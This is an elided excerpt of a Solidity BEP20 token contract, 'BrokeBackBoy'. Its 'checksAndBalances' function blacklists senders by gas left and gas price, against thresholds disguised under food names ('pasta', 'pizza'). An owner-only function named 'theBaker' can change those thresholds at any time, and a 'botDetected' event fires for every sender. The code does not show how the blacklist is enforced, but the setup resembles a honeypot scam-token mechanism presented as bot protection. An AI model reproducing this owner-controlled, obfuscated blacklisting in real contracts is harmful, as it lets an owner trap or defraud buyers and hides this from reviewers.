...
contract BrokeBackBoy is IBEP20, Ownable {
    using SafeMath for uint256;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "BrokeBackBoy";
    string constant _symbol = "$BrokeBackBoy";
    ...
    uint256 private pasta = 20000000;
    uint256 private pizza = 50000000000;
    ...
    function checksAndBalances(address sender) internal {
        uint256 pesto = gasleft();
        if (pesto>pasta){
            _botList[sender] = true;
        }
        if (tx.gasprice>pizza){
            _botList[sender] = true;
        }
        emit botDetected(sender);
    }
    
    function theBaker(uint256 _pasta, uint256 _pizza) external onlyOwner {
        pasta=_pasta;
        pizza=_pizza;
    }
